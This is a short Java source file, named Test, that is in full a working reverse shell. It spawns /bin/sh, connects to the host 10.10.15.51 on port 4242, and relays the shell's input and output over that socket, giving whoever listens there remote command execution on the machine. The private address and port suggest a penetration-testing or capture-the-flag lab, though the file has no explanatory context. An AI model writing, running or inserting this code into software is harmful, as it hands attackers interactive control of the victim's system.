import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;


public class Test{
	public static void main(String[] args) throws IOException{
		String host="10.10.15.51";
		int port=4242;
		String cmd="/bin/sh";
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
		Socket s=new Socket(host,port);
		InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
		OutputStream po=p.getOutputStream(),so=s.getOutputStream();
		while(!s.isClosed()) {
		while(pi.available()>0)
			so.write(pi.read());
		while(pe.available()>0)
			so.write(pe.read());
		while(si.available()>0)
			po.write(si.read());
		so.flush();
		po.flush();
		try {
			p.exitValue();
			break;
		}
		catch (Exception e){
		}
		};
		p.destroy();
		s.close();
	}
}
